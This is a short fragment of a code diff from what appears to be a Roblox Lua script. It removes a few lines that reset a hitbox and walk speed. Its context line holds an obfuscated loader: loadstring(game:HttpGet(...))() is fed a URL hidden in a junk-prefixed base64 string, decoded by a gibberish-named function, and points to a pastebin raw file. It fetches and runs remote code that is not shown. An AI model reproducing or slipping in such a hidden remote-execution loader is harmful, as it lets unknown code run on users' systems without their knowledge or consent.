@@ -8,6 +8,3 @@ data = string.gsub(data, '[^'..b..'=]', '') return (data:gsub('.', function(x) i
  
  
 loadstring(game:HttpGet(xWqUpRZHlTcThCSQCPdZzxMXktbELWMUeyelpRoRUpxwEOJoNzLUVCFYkIKRp('hbMIqbqBVdTqrrCnaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L1ZIbm56Z3p2')))()
-	hitbox:Destroy()
-	Humanoid.WalkSpeed = 16
-end)
